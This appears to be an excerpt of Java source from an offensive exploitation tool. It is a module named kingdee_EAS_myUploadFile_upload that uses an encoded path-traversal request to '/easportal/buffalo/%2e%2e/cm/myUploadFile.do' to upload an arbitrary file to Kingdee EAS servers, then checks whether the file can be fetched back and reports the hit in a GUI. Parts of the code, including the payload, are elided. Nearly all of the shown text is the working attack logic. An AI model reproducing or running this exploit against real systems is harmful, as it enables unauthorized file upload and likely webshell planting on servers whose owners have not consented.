...
public class kingdee_EAS_myUploadFile_upload implements Exploitlnterface {
    @Override
    ...
    public static String myUploadFile(String url,String filename,String content){
        ...
        Response res = HttpTools.post(url+"/easportal/buffalo/%2e%2e/cm/myUploadFile.do",postData,head,"utf-8");
        if(res.getCode()==200 ){
            Response res1 = HttpTools.get(url+"/easportal/buffalo/../"+filename,head,"utf-8");
            if(res1.getText().contains(content.substring(0,2))||res1.getText().contains("R4g")){
                return url+"/easportal/buffalo/../"+filename;
            }
        }
        return null;
    }
    ...
    private Boolean att(String url,TextArea textArea) {
        try {
            ...
            String result = myUploadFile(url,filename,payload);


            if ( result != null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ kingdee_EAS_myUploadFile_upload ]");
